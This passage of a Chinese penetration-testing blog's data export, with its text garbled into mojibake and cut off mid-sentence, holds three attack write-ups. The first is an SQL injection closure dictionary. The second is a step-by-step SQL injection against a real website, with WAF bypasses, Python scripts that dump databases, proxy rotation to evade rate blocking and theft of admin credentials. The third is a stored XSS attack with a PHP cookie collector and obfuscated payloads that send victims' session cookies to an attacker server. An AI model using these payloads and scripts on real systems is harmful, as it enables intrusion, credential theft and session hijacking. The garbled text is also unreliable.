åŒå¼•å·å’ŒåŒæ‹¬å· &quot;)) è¡Œå°¾æ³¨é‡Šï¼š # --+ -- - ;%00 å°†å‚æ•°è¿›è¡Œé—­åˆï¼Œå¹¶ä¸”æ³¨é‡Šåé¢çš„ä»£ç åå‘é€è¯·æ±‚ï¼Œå¦‚æœè¿”å›å€¼è·Ÿæ­£å¸¸è¯·æ±‚è¿”å›ä¸€æ ·ï¼Œå°±å¯ä»¥ç¡®å®šè¯·æ±‚å‚æ•°çš„ç±»å‹å’Œé—­åˆç¬¦å·ã€‚ äº¤å‰ç»„åˆä¸€ä¸‹å°±ä¼šæœ‰ 36 ç§æƒ…å†µ int str å•å¼•å· str åŒå¼•å· 1# 1â€™# 1â€# 1)# 1â€™)# 1â€)# 1))# 1â€™))# 1â€))# 1â€“+ 1â€™â€“+ 1â€â€“+ 1)â€“+ 1â€™)â€“+ 1â€)â€“+ 1))â€“+ 1â€™))â€“+ 1â€))â€“+ 1â€“ - 1â€™â€“ - 1â€â€“ - 1)â€“ - 1â€™)â€“ - 1â€)â€“ - 1))â€“ - 1â€™))â€“ - 1â€))â€“ - 1;%00 1â€™;%00 1â€;%00 1);%00 1â€™);%00 1â€);%00 1));%00 1â€™));%00 1â€));%00 å°†æ‰€æœ‰çš„æƒ…å†µæ·»åŠ åˆ°ä¸€ä¸ªtxtæ–‡æœ¬ä½œä¸ºç®€å•çš„é€šç”¨å­—å…¸ï¼Œå®é™…åº”ç”¨ä¸­ä½¿ç”¨ burpsuite intruder æ¨¡å—è¿›è¡Œæµ‹è¯•ã€‚ 0x01 æ¡ˆä¾‹GET è¯·æ±‚è¯¥ç½‘ç«™æœ‰é€šè¿‡ id æŸ¥è¯¢æ–‡ç« çš„åŠŸèƒ½ burpsuite æŠ“åŒ…å‘é€åˆ° intruder æ¨¡å—ï¼Œsimper æ¨¡å¼è¿›è¡Œçˆ†ç ´ï¼Œå°† id å‚æ•°åŒ– ä½¿ç”¨ä¸Šä¸€æ­¥ä¿å­˜çš„å­—å…¸ï¼ŒåŸå§‹å‚æ•°å€¼æ˜¯ 290 çˆ†ç ´çš„ç»“æœæŒ‰ç…§è¿”å›å€¼å¤§å°é™åºæ’åˆ—ï¼Œå¯ä»¥çœ‹å‡ºè¿™ä¸ªè¯·æ±‚çš„å‚æ•°æ˜¯ int ç±»å‹ï¼Œæ²¡æœ‰å¼•å·é—­åˆï¼Œ-- -ã€#ã€;%00 ä¸‰ç§æ³¨é‡Šæ–¹å¼æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ POST è¯·æ±‚è¿™ä¸ª POST è¯·æ±‚æ˜¯é€šè¿‡å®¢æˆ·æ˜µç§°æŸ¥è¯¢æ•°æ®çš„åŠŸèƒ½ï¼ŒæŠ“åŒ…å°†å®¢æˆ·æ˜µç§° customerName å‚æ•°åŒ– æŠŠä¸Šä¸€æ­¥çš„å­—å…¸ä¸­çš„åŸå§‹å‚æ•°å€¼æ¢æˆæ­¤æ¥å£çš„æ­£ç¡®å‚æ•°å€¼ã€‚ POST è¯·æ±‚è®°å¾—å°† Intruder -&gt; Palyloads -&gt; Palyload Encoding ä¸‹é¢çš„ URL ç¼–ç å–æ¶ˆå‹¾é€‰ï¼Œå¦åˆ™å‚æ•°å€¼ -- - ä¸­çš„ç©ºæ ¼ä¼šè¢«è½¬ä¹‰æˆ %20 å¯¼è‡´è¯·æ±‚å¤±è´¥ã€‚ çˆ†ç ´çš„ç»“æœæŒ‰ç…§è¿”å›å€¼å¤§å°é™åºæ’åˆ—ï¼Œå¯ä»¥çœ‹å‡ºè¿™ä¸ªè¯·æ±‚çš„å‚æ•°æ˜¯ str å­—ç¬¦ä¸²ç±»å‹ï¼Œä½¿ç”¨å•å¼•å·é—­åˆï¼Œ#ã€;%00 æ³¨é‡Šæ–¹å¼è¢«è¿‡æ»¤ï¼Œ-- - å¯ä»¥æ­£å¸¸æ³¨é‡Šã€‚","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"å®æˆ˜ç»•è¿‡ä¸¤å±‚wafå®Œæˆsqlæ³¨å…¥","slug":"å®æˆ˜ç»•è¿‡ä¸¤å±‚wafå®Œæˆsqlæ³¨å…¥","date":"2020-04-15T04:00:00.000Z","updated":"2020-04-15T12:52:12.434Z","comments":true,"path":"2020/04/15/å®æˆ˜ç»•è¿‡ä¸¤å±‚wafå®Œæˆsqlæ³¨å…¥/","link":"","permalink":"http://yoursite.com/2020/04/15/%E5%AE%9E%E6%88%98%E7%BB%95%E8%BF%87%E4%B8%A4%E5%B1%82waf%E5%AE%8C%E6%88%90sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"ä»¥ä¸‹å†…å®¹ä»…ä½œä¸ºå­¦ä¹ ç ”ç©¶ï¼Œç¦æ­¢ç”¨äºè¿æ³•çŠ¯ç½ªæ´»åŠ¨ï¼Œç”±æ­¤äº§ç”Ÿçš„æ³•å¾‹é£é™©è‡ªè¡Œæ‰¿æ‹…ã€‚ æŸç½‘ç«™å­˜åœ¨ä¸€å¤„sqlæ³¨å…¥æ¼æ´ã€‚ ç¬¬ä¸€å±‚ wafåœ¨ id åé¢åŠ ä¸Š and 1=1ï¼Œè¢« waf æ‹¦æˆª å°†ç©ºæ ¼æ›¿æ¢ä¸ºåŠ å· +ï¼Œå³ id=296+and+1=1 ä¸å†æ‹¦æˆª å†å°† id æ”¹ä¸º id=296+and+1=2ï¼Œæ–°é—»è¯¦æƒ…è¿”å›ä¸ºç©ºï¼Œç¡®è®¤å­˜åœ¨æ³¨å…¥æ¼æ´ é€šè¿‡ order by æŸ¥è¯¢å­—æ®µæ•° â†“ å­—æ®µæ•°è¶…è¿‡é•¿åº¦çš„æ—¶å€™ï¼Œæ–°é—»è¯¦æƒ…å±•ç¤ºä¸ºç©ºï¼Œæ²¡æœ‰è¶…è¿‡é•¿åº¦çš„æ—¶å€™æ­£ç¡®å±•ç¤ºæ–°é—»è¯¦æƒ… é€šè¿‡äºŒåˆ†æ³•ä¸æ–­æµ‹è¯•ï¼ŒæŸ¥è¯¢çš„å­—æ®µæ•°ä¸º 11 union è”åˆæŸ¥è¯¢åˆ¤æ–­å­—æ®µè¾“å‡ºä½ç½® â†“å°† union å‰é¢çš„idå€¼è®¾ç½®ä¸ºè´Ÿæ•°ï¼Œä½¿ä¹‹è¿”å›ä¸ºå‡ä»é¡µé¢è¿”å›å¯ä»¥çœ‹å‡ºï¼Œ2ï¼Œ4ï¼Œ8 çš„ä½ç½®èƒ½å±•ç¤ºè¿”å›å†…å®¹ åˆ†åˆ«æŸ¥è¯¢user()ã€version()ã€database() ç¡®è®¤å¯ä»¥æ­£å¸¸è¿”å› é€‰æ‹©æ ‡é¢˜ä½ç½®ç»§ç»­è·å–æ›´å¤šä¿¡æ¯ æŸ¥è¯¢æ‰€æœ‰çš„æ•°æ®åº“åï¼Œè¢« waf æ‹¦æˆª åˆ†åˆ«å°† URL ä¸­çš„ group_concat()ã€fromã€information_schemaã€schemata å­—ç¬¦ä¾æ¬¡åˆ é™¤å¹¶å‘é€è¯·æ±‚.æœ€åç¡®å®šæ˜¯group_concat() å‘½ä¸­äº†wafè§„åˆ™ï¼Œå¹¶ä¸”æ˜¯ group_concat å’Œæ‹¬å· () åœ¨ä¸€èµ·çš„æ—¶å€™æ‰ä¼šè§¦å‘æ‹¦æˆªã€‚ å°† group_concat() æ›¿æ¢ä¸º group_concat/**/()ï¼Œä»ç„¶è¢«æ‹¦æˆª ä¸ç¡®å®šæ˜¯é»‘åå•åŒ¹é…è¿˜æ˜¯åªè¦åŒ…å«/**/è¿™ç±»æ³¨é‡Šå°±ç”¨æ­£åˆ™åŒ¹é…å…¨éƒ¨æ‹¦æˆªï¼Œæµ‹è¯•ä¸€ä¸‹ï¼Œæ‰“å¼€burpsuiteï¼Œä½¿ç”¨intrudeæ¨¡å—åœ¨ /**/ ä¸­é—´åŠ å…¥éšæœºä»»æ„å­—ç¬¦ä¸²ä¾‹å¦‚ /*asd13*/ ç­‰ï¼Œå‘ç°ç¡®å®æœ‰äº›è¿”å›åŒ…ä¸æ˜¯ waf æ‹¦æˆªï¼Œä½†æ˜¯è¿”å›çŠ¶æ€ç 403ä¸”æœ‰å¦‚ä¸‹æç¤ºï¼ŒåŒæ ·æ— æ³•æ­£å¸¸å±•ç¤ºæ³¨å…¥çš„æ•°æ®ï¼Œæ­¤è·¯è¡Œä¸é€š å°è¯•å†…æ•›æ³¨é‡Š /*!group_concat()*/ ä¹Ÿè¢«æ‹¦æˆª æ‹¼æ¥å­—ç¬¦ä¸²ç›¸å…³çš„ concat()å‡½æ•°ã€concat_ws()å‡½æ•°éƒ½è¢«æ‹¦æˆªã€‚ å¥½å§ï¼Œé‚£å°±ä¸ç›´æ¥è·å–å…¨éƒ¨è¿”å›å€¼äº†ï¼Œè€è€å®å®åŠ ä¸Š limit ä¸€ä¸ªä¸€ä¸ªæ¥å§æ²¡æœ‰è¢« waf æ‹¦æˆªï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾æ•°æ® é—®é¢˜æ¥äº†ï¼Œversion()ã€user() è¿™äº›å¯ä»¥æ­£å¸¸è¿”å›åˆ°å‰ç«¯é¡µé¢ï¼Œè¯´æ˜è¿™ä¸ªæ³¨å…¥ç‚¹æ˜¯å¯ä»¥å›æ˜¾çš„ï¼Œä½†æ˜¯å…·ä½“æŸ¥è¯¢è¡¨æ•°æ®çš„æ—¶å€™ä¸å±•ç¤ºï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯åå°ä»£ç å¯¹è¿”å›åˆ°å‰ç«¯çš„æ•°æ®åšäº†è¿‡æ»¤ï¼Œæ¶‰åŠæ•æ„Ÿåº“è¡¨ä¿¡æ¯çš„å°±è¿”å›ç©ºå€¼ã€‚ å› æ­¤å°±å…ˆä¸èŠ±ç²¾åŠ›å»å°è¯•å¸ƒå°”ç›²æ³¨ã€æ—¶é—´ç›²æ³¨ã€NDSlogç›²æ³¨ç­‰æµªè´¹æ—¶é—´çš„æ“ä½œã€‚å…ˆå°†æŸ¥è¯¢çš„æ•°æ®åšä¸€æ¬¡å˜å½¢ï¼Œçœ‹æ˜¯å¦èƒ½ç»•è¿‡åå°åŒ¹é…é€»è¾‘ã€‚ ascii()å°†æŸ¥è¯¢çš„æ•°æ®æ”¾åˆ° ascii() æ–¹æ³•ä¸­ï¼Œwaf æ²¡æœ‰æ‹¦æˆªï¼Œå¯ä»¥æ­£å¸¸è¿”å›æ•°æ®ascii() æ–¹æ³•æ˜¯è¿”å›å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ascii å€¼ï¼Œæ‰€ä»¥è¿™é‡ŒæŸ¥è¯¢åˆ°çš„æ•°æ®åº“åç¬¬ä¸€ä¸ªå­—æ¯æ˜¯ hã€‚å¯ä»¥å†™ä¸ªç®€å•çš„è„šæœ¬æˆ–è€…ç”¨ burpsuite æ›¿æ¢ limit çš„å€¼æŒ¨ä¸ªæŸ¥è¯¢å‰©ä½™æ•°æ®åº“åçš„æ¯ä¸ªå­—ç¬¦ä¸²asciiå€¼å†è½¬æ¢å›å­—ç¬¦ä¸² hex()å°†æŸ¥è¯¢çš„æ•°æ®æ”¾åˆ° hex() æ–¹æ³•ä¸­ï¼Œwaf ä¹Ÿæ²¡æœ‰æ‹¦æˆªï¼ŒåŒæ ·å¯ä»¥æ­£å¸¸è¿”å›æ•°æ®æ¯” ascii() æ›´æ–¹ä¾¿ï¼Œå¯ä»¥å°†æ•´æ¡æ•°æ®éƒ½è¿›è¡Œ hex ç¼–ç è€Œä¸åªæ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå†é€šè¿‡ unhex() æ–¹æ³•è½¬æ¢å›å­—ç¬¦ä¸²æ¥ä¸‹æ¥å°±å¯ä»¥æ‰‹åŠ¨+burpsuitè·å–ä¸€ä¸ªä¸ªè¡¨åå’Œè¡¨å†…æ•°æ®äº† ç¬¬äºŒå±‚äº‘ wafburp è·å–çš„æ•°æ®ä¸å¤Ÿç›´è§‚ï¼Œç”¨ python é‡æ–°å†™ä¸€ä¸‹ è·å–å…¨éƒ¨æ•°æ®åº“å â†“1234567891011121314151617import time,requests,lxmlfrom bs4 import BeautifulSoupheaders = &#123; 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36 Edg/81.0.416.50'&#125;for i in range(0,10000): url = 'http://www.xxx.com/xx.php?id=296+and+1=2+union+select+1,2,3,4,5,6,7,unhex(hex(schema_name)),9,10,11+from+information_schema.schemata+limit+%d,1--+' % i r = requests.get(url,headers=headers) soup = BeautifulSoup(r.text,'lxml') result = soup.select('div.main_word &gt; div.main_cont &gt; div.new_txt')[0].text.strip() if result != '': print(result) else: print('æ‰€æœ‰åº“æŸ¥è¯¢å®Œæ¯•'+'\\n'+'-'*30) break å½“å‰æƒé™åªæŸ¥è¯¢å‡ºä¸¤ä¸ªè¡¨ï¼Œä¸€ä¸ªæ˜¯ mysql å†…ç½®çš„ information_schemaï¼Œå¦ä¸€ä¸ªå°±æ˜¯ç½‘ç«™ç®¡ç†å‘˜è‡ªå®šä¹‰çš„è¡¨ hxxxxxxg è·å– hxxxxxxg åº“å†…çš„æ‰€æœ‰è¡¨åç§° â†“ä¸Šé¢ä»£ç ä¸­ url ä¸­çš„å‚æ•°æ¢æˆæŸ¥è¯¢è¡¨åç§°çš„ sql 123456789101112...for i in range(0,10000): url = 'http://www.xxx.com/xx.php?id=296+and+1=2+union+select+1,2,3,4,5,6,7,unhex(hex(table_name)),9,10,11+from+information_schema.tables+where+table_schema=\"hxxxxxxg\"+limit+%d,1--+'%i r = requests.get(url,headers=headers) soup = BeautifulSoup(r.text,'lxml') result = soup.select('div.main_word &gt; div.main_cont &gt; div.new_txt')[0].text.strip() if result != '': print(result) else: print('æ‰€æœ‰è¡¨æŸ¥è¯¢å®Œæ¯•') break æŸ¥è¯¢åˆ°8ä¸ªè¡¨åè„šæœ¬æ‰§è¡ŒæŠ¥é”™ï¼Œåœ¨è¿”å›é¡µé¢æ‰¾ä¸åˆ°æ•°æ®æ‰“å¼€æµè§ˆå™¨æŸ¥çœ‹æ˜¯å› ä¸ºè¢«å¦ä¸€ä¸ª waf æ‹¦æˆªå¯¼è‡´çš„ï¼Œè¿™ä¸ªæ˜¯è¥¿éƒ¨æ•°æ®çš„äº‘ waf å¹³å°ç»•è¿‡äº‘ waf çš„æ€è·¯ä¸»è¦æ˜¯æ‰¾è¯¥ç½‘ç«™çš„çœŸå® IPï¼Œå¦‚æœèƒ½æ‰¾åˆ°çœŸå® IP åœ¨æœ¬åœ°ç”µè„‘ host ç»‘å®šä¸€ä¸‹ï¼Œé‚£ä¹ˆäº‘ waf å°±å½¢åŒè™šè®¾ã€‚ é¦–å…ˆéªŒè¯æ˜¯å¦æœ‰ CDNå¤šä¸ªåœ°åŒºçš„ ping åœ°å€ä¸€æ ·ï¼Œè§£æçš„ IP åœ°å€éƒ½æ˜¯è¥¿éƒ¨æ•°ç æ•°æ®ä¸­å¿ƒï¼Œä¹Ÿå°±æ˜¯äº‘ waf çš„æœºæˆ¿ æŸ¥çœ‹ DNS è§£æå†å²ä»ä¸åŒçš„ DNS å†å²è§£æå¹³å°æŸ¥è¯¢åˆ°å‡ ä¸ªè·Ÿäº‘ waf ä¸åŒç½‘æ®µçš„IPï¼Œå¾ˆå¯èƒ½æ˜¯ç½‘ç«™ä¹‹å‰çš„çœŸå® IP ç„¶è€Œâ€¦æŒ¨ä¸ªè®¿é—®è¿™äº› IP å‘ç°æ—©å·²æ— æ³•è®¿é—®ã€‚ æŸ¥è¯¢å­åŸŸå IPlayerå­åŸŸåæŒ–æ˜æœºå’Œsubdomainbruteæ‰«æå­åŸŸåå‘ç°ä¸¤ä¸ªå…¶ä»–çš„åŸŸåï¼Œä¸€ä¸ªmailå¼€å¤´çš„ IP ï¼Œè®¿é—®è·³è½¬åˆ°äº†ç½‘æ˜“é‚®ç®±ä¸»é¡µï¼Œåº”è¯¥æ˜¯è¯¥ç½‘ç«™çš„ä¼ä¸šé‚®ç®±ç”¨çš„ç½‘æ˜“é‚®ç®±æœåŠ¡ã€‚å¦ä¸€ä¸ªåŸŸåæ˜¯smtpï¼Œè®¿é—®è¿™äº› IP ä¹Ÿæ—©å·²ç»æ— æ³•è®¿é—® è¯¥ç½‘ç«™ä¹Ÿæ²¡æœ‰è°ƒèµ·å‘é€é‚®ä»¶çš„å…¥å£(ä¾‹å¦‚é‚®ç®±æ³¨å†Œç­‰)ï¼Œæ— æ³•é€šè¿‡é‚®ä»¶è·å–çœŸå® IPã€‚é€šè¿‡é’Ÿé¦—ä¹‹çœ¼ã€fofaã€shodan ç­‰å¹³å°ä¹Ÿæ²¡æœ‰æ‰¾åˆ°è¯¥ç½‘ç«™æœ‰ä»·å€¼çš„æ•°æ®ã€‚æŸ¥æ‰¾çœŸå® IP ç»•è¿‡äº‘ waf è¿™æ¡è·¯æš‚æ—¶æ²¡æœ‰å¥½åŠæ³•ï¼Œæ”¾å¼ƒã€‚ å³°å›è·¯è½¬ â†“æ ¹æ®è¿™ä¸ªäº‘ waf çš„æç¤ºå¾ˆå¯èƒ½æ˜¯ç”±äºè¯·æ±‚é€Ÿåº¦è¿‡å¿«ï¼Œè¢«å½“ä½œæ˜¯æ”»å‡»è¡Œä¸ºè¿›è¡Œäº†æ‹¦æˆªå¯¼è‡´ ip è¢«banã€‚ äºæ˜¯æ›´æ¢ ip å¹¶å¢åŠ ç­‰å¾…æ—¶é—´ç»“æœä¸ä¹…åè¿˜æ˜¯è¢«æ‹¦æˆªã€‚ æƒ³èµ·ä¹‹å‰åšçˆ¬è™«æ—¶å€™å†™çš„ [ip ä»£ç†æ± ]ï¼ŒçŒœæƒ³ï¼šå¦‚æœæ¯æ¬¡è¯·æ±‚æ›´æ¢ä¸€ä¸ªéšæœºçš„ ip æ˜¯å¦èƒ½ç»•è¿‡ wafã€‚ IP_POOL æ˜¯ä¸€ä¸ªè‡ªåŠ¨è·å– ip çš„ç¨‹åºï¼Œpython ç¼–å†™ï¼Œé…åˆå®‰è£…åœ¨æœ¬åœ°çš„ redis æ•°æ®åº“ç»´æŒä»£ç†æ± çš„å¯ç”¨æ€§ï¼Œé»˜è®¤ä»è¥¿åˆºä»£ç†å’Œå¿«ä»£ç†é‡‡é›†å‰10é¡µçš„å…è´¹ä»£ç†ï¼Œä¹Ÿå¯ä»¥æ‰‹åŠ¨æ·»åŠ å…¶ä»–ç½‘ç«™è¿›è¡Œé‡‡é›†ï¼Œæˆ–è€…è´­ä¹°ä»˜è´¹ä»£ç†æ·»åŠ åˆ°æ­¤ç¨‹åºä¸­ã€‚ä½¿ç”¨ flask åº“å¯¹å¤–å¼€æ”¾ä¸‰ä¸ªæ¥å£ï¼Œåˆ†åˆ«æ˜¯ï¼šè·å–å…¨éƒ¨ ipï¼Œéšæœºè·å–ä¸€ä¸ªå¯ç”¨ ipï¼Œè·å–æ‰€æœ‰çš„ ip æ•°é‡ äºŒè¯ä¸è¯´ï¼Œæ‰¾åˆ°ä¹‹å‰å†™çš„ä»£ç ï¼Œè¿è¡Œèµ·æ¥å°†è·å– ip çš„æ¥å£å¸¦å…¥åˆ°ä¹‹å‰çš„è¯·æ±‚ä¸­å†æ¬¡å°è¯•ï¼Œæ¯æ¬¡è¯·æ±‚éšæœºæ›´æ¢ä¸€ä¸ª ipã€‚ 12345678def get_proxy(): proxy = requests.get('http://localhost:5000/random').text return proxyfor i in range(0,10000): ... r = requests.get(url,headers=headers,proxies=&#123;'http':'http://'+get_proxy()&#125;) ... è¯¥æ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨éƒ½æŸ¥äº†å‡ºæ¥ï¼Œå…± 338 ä¸ªè¡¨ã€‚ å…¶ä¸­æœ‰ä¸€ä¸ª â€œ**_adminâ€ è¡¨ï¼Œåº”è¯¥å‚¨å­˜é‡Œç®¡ç†å‘˜çš„ä¿¡æ¯ï¼ŒæŸ¥ä¸€ä¸‹å­—æ®µã€‚æœç„¶æœ‰ uname å’Œ pwd å­—æ®µï¼ŒæˆåŠŸæ‹¿åˆ°ç®¡ç†å‘˜è´¦å·å¯†ç ã€‚ è‡ªåŠ¨è·å–å…¶ä»–è¡¨æ•°æ®åŒç†ï¼Œå°†pythonè„šæœ¬ä¸­ URL çš„å‚æ•°ä¿®æ”¹ä¸ºæŸ¥è¯¢è¡¨æ•°æ®çš„ sql å³å¯ï¼Œä¸å†èµ˜è¿° æ€»ç»“1.ç»•è¿‡ç¬¬ä¸€å±‚ waf æ˜¯åˆ©ç”¨äº†å®ƒå¯¹æ•æ„Ÿå‡½æ•°è¿‡æ»¤ä¸ä¸¥æ ¼ï¼Œå¯ä»¥åˆ©ç”¨hexç¼–ç /è§£ç æ¥ä½¿å¾—æŸ¥è¯¢çš„æ•°æ®æ­£å¸¸å±•ç¤ºã€‚2.å¹³æ—¶å¯ä»¥ç»´æŠ¤ä¸€ä¸ªä»£ç†æ± ï¼Œåœ¨é‡åˆ°äº‘ waf æ— æ³•æ‰¾åˆ°ç½‘ç«™çœŸå® ip çš„æ—¶å€™å¯ä»¥ä»è¿™æ–¹é¢ç»•è¿‡ã€‚","categories":[{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"ç”±markdownå¼•å‘çš„XSSï¼Œè·å–å…¶ä»–ç”¨æˆ·çš„cookieç™»å½•ä¿¡æ¯","slug":"markdownå¼•å‘çš„XSS","date":"2020-03-26T04:00:00.000Z","updated":"2020-04-13T04:15:18.289Z","comments":true,"path":"2020/03/26/markdownå¼•å‘çš„XSS/","link":"","permalink":"http://yoursite.com/2020/03/26/markdown%E5%BC%95%E5%8F%91%E7%9A%84XSS/","excerpt":"","text":"æ¯å¤©å†™æ–‡ç« éƒ½ç”¨çš„ markdown è¯­æ³•æœ¬èº«æ˜¯æ”¯æŒç›´æ¥å†™å…¥ html è¯­å¥çš„ï¼Œä¸€äº›æ”¯æŒ markdown çš„è®ºå›æˆ–å†™ä½œç½‘ç«™ä¸ºäº†å®‰å…¨æ€§é€šå¸¸ä¼šç‰ºç‰²ä¸€äº›ä¾¿åˆ©ï¼Œå°†æ•æ„Ÿçš„ HTML æ ‡ç­¾å’Œ JS å‡½æ•°è¿›è¡Œè¿‡æ»¤ï¼Œç¦æ­¢ç”¨æˆ·è¾“å…¥ã€‚æ—¢ç„¶æ˜¯é»‘åå•è¿‡æ»¤é‚£è‚¯å®šå°±æœ‰ç–å¿½çš„æ—¶å€™ï¼Œå¸¦ç€è¿™ç§çŒœæƒ³å»ç½‘ä¸Šå¯»æ‰¾åœ¨çº¿çš„ markdown ç½‘ç«™ï¼Œæœä¸å…¶ç„¶å‘ç°äº†ä¸€å¤„å­˜å‚¨å‹ XSS ã€‚ åˆæ­¥éªŒè¯ä¸‹å›¾æŸç½‘ç«™å·¦è¾¹ä¸ºæ–‡ç« ç¼–è¾‘åŒºåŸŸï¼Œå³è¾¹æ˜¯æ–‡ç« å®æ—¶é¢„è§ˆåŒºåŸŸã€‚ ç›´æ¥åœ¨æ ‡é¢˜å¤„å¼€å¹²ï¼Œè¾“å…¥ &lt;script&gt;ã€&lt;img&gt;ã€&lt;iframe&gt;ç­‰ï¼Œå‘ç°éƒ½è¢«è¿‡æ»¤æ²¡æœ‰æ˜¾ç¤º è€Œè¾“å…¥ &lt;&gt; ä¸ä¼šè¢«è¿‡æ»¤ ç»è¿‡åå¤å°è¯•å‘ç°åªä¼šè¿‡æ»¤å®Œæ•´æ ‡ç­¾ï¼Œä¸”åªè¿‡æ»¤äº†ä¸€æ¬¡ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡åŒå†™ç»•è¿‡ï¼Œå¦‚ä¸‹å›¾ å¼¹ä¸ªçª—è¯•ä¸€ä¸‹ å—¯ï¼Œalert() è¿™ä¹ˆæ•æ„Ÿçš„å‡½æ•°éƒ½æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œçœ‹èµ·æ¥äº‹æƒ…æ¯”æƒ³è±¡çš„é¡ºåˆ© æ·±å…¥åˆ©ç”¨F12 è°ƒå‡ºæ§åˆ¶å°æŸ¥çœ‹ä¸€ä¸‹ç”¨æˆ· cookie åŒ…å«ç™»å½•æ€çš„ session ç­‰æ²¡æœ‰è®¾ç½® httponlyï¼ŒXSSè·å–ç”¨æˆ·cookieçš„å¿µå¤´æ²¹ç„¶è€Œç”Ÿ å¼¹çª—çœ‹ä¸€ä¸‹ï¼Œdocument.cookie æ–¹æ³•æ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ç›´æ¥å¼¹å‡ºç”¨æˆ· cookie è¯¥ç½‘ç«™ç”¨æˆ·ç¼–å†™çš„å†…å®¹ä¼šè‡ªåŠ¨ä¿å­˜å¹¶ä¸”æœ‰åˆ†äº«åŠŸèƒ½ okï¼Œç»§ç»­ï¼Œåœ¨æœåŠ¡å™¨åˆ›å»ºä¸€ä¸ªphpè„šæœ¬æ¥æ”¶é›†cookieï¼Œæ–‡ç« è¢«æµè§ˆåè‡ªåŠ¨åœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ª cookie.txt æ–‡ä»¶å­˜å‚¨ç”¨æˆ·ç™»å½•ä¿¡æ¯ 1234&lt;?php$cookie = $_GET['cookie'];file_put_contents('cookie.txt',$cookie);?&gt; ç¼–å†™ payload 1&lt;&lt;img&gt;img src=# onerror=eval(new Image().src=\"http://xx.xx.xx.xx/cookie.php?cookie=\"+document.cookie)&gt; å°† payload å†™å…¥æ–‡ç« å†…å¹¶ä¿å­˜ï¼ŒæŸ¥çœ‹æœåŠ¡å™¨ã€‚ å¹¶æ²¡æœ‰ç”Ÿæˆä¿å­˜ cookie çš„æ–‡ä»¶ï¼Œåº”è¯¥æ˜¯å“ªé‡Œè¢«æ‹¦æˆªäº†ï¼Œåˆšå¼€å§‹çŒœæµ‹çš„æ˜¯ document.cookie å†™æ³•çš„é—®é¢˜ã€‚ å°è¯•ï¼Œç”¨ window[&quot;document&quot;][&quot;cookie&quot;] ä»£æ›¿ document.cookieï¼Œæ— æ•ˆ 1&lt;&lt;img&gt;img src=# onerror=eval(new Image().src=\"http://xx.xx.xx.xx/cookie.php?cookie=\"+window[\"document\"][\"cookie\"])&gt; åˆ©ç”¨æ‹¼æ¥ï¼Œæ— æ•ˆ 1&lt;&lt;img&gt;img src=# onerror=eval(new Image().src=\"http://xx.xx.xx.xx/cookie.php?cookie=\"+window[\"doc\"+\"ument\"][\"coo\"+\"kie\"])&gt; ç”¨16è¿›åˆ¶ä»£æ›¿ï¼Œæ— æ•ˆ 1&lt;&lt;img&gt;img src=# onerror=eval(new Image().src=\"http://xx.xx.xx.xx/cookie.php?cookie=\"+window[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x63\\x6f\\x6f\\x6b\\x69\\x65\"])&gt; ä¸€ç›´ä»¥ä¸ºæ˜¯ document.cookie çš„é—®é¢˜ï¼Œä»”ç»†ä¸€çœ‹çªç„¶æƒ³åˆ°æ˜¯ä¸æ˜¯ new åé¢çš„ç©ºæ ¼å¯¼è‡´çš„ å°†ç©ºæ ¼ç”¨æ³¨é‡Šç¬¦å· /**/ ä»£æ›¿ï¼Œå†æ¬¡å°è¯•ï¼ŒæˆåŠŸè·å¾—è‡ªå·±çš„ cookie å…¶å®è¿˜æœ‰ä¸€ä¸ªç™¾è¯•ä¸çˆ½çš„æ–¹æ³•ï¼Œåœ¨å¾ˆå¤š XSS ç»•ä¸è¿‡çš„æ—¶å€™ï¼Œå°† payload è½¬ä¸º String.formCharCode() æ ¼å¼ï¼Œèƒ½ç»•è¿‡å¾ˆå¤šçš„è¿‡æ»¤ï¼Œè„‘é˜”å¡ä½çš„æ—¶å€™ä¸ç»æ„é—´è®©äººå³°å›è·¯è½¬ã€‚ 1&lt;&lt;img&gt;img src=# onerror=eval(String.fromCharCode(110,101,119,32,73,109,97,103,101,40,41,46,115,114,99,61,34,104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,51,49,46,49,50,56,47,99,111,111,107,105,101,46,112,104,112,63,99,111,111,107,105,101,61,34,43,101,110,99,111,100,101,85,82,73,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))&gt; æŠŠç¼–è¾‘å¥½çš„æ–‡ç« å‘å¸ƒ å¾—åˆ°ä¸€ä¸ªåˆ†äº«é“¾æ¥ï¼Œå°†æ–‡ç« é“¾æ¥åˆ†äº«å…¶ä»–ç”¨æˆ·ï¼Œç­‰å¾…å¯¹æ–¹æ‰“å¼€é˜…è¯»https://www.xxxxx.com/asd1/note/1682115 å¯¹æ–¹é˜…è¯»ååœ¨æœåŠ¡å™¨å¯ä»¥ç«‹å³çœ‹åˆ° cookie ä¿¡æ¯ï¼Œå°† cookie 